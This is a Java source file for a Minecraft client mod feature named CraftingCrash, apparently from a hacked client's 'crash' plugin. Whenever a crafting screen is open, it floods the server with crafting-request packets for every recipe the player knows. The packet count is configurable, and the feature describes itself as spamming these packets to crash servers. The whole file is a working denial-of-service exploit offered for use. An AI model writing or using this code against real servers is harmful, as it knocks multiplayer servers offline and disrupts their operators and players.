package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.network.packet.c2s.play.CraftRequestC2SPacket;
import net.minecraft.recipe.Recipe;
import net.minecraft.screen.CraftingScreenHandler;

import java.util.List;

public class CraftingCrash extends Feature {

    public final Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Packet Count")
            .value(25)
            .min(1)
            .max(100)
            .inc(1)
            .build();
    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Auto Disable")
            .value(true)
            .build();

    public CraftingCrash() {
        super(CrashPlugin.CRASH, "Spam craft request packets. Use with planks in inventory for best results.");
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        if (!(Wrapper.INSTANCE.getLocalPlayer().currentScreenHandler instanceof CraftingScreenHandler) || Wrapper.INSTANCE.getMinecraft().getNetworkHandler() == null) return;
        try {
            List<RecipeResultCollection> recipeResultCollectionList = Wrapper.INSTANCE.getLocalPlayer().getRecipeBook().getOrderedResults();
            for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                for (Recipe<?> recipe : recipeResultCollection.getRecipes(true)) {
                    for (int i = 0; i < packetCountProperty.value(); i++) {
                        NetworkHelper.INSTANCE.sendPacket(new CraftRequestC2SPacket(Wrapper.INSTANCE.getLocalPlayer().currentScreenHandler.syncId, recipe, true));
                    }
                }
            }
        } catch (Exception ignored) {
            ChatHelper.INSTANCE.addClientMessage("Stopping crash because an error occurred!");
            setState(false);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));


    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));
}
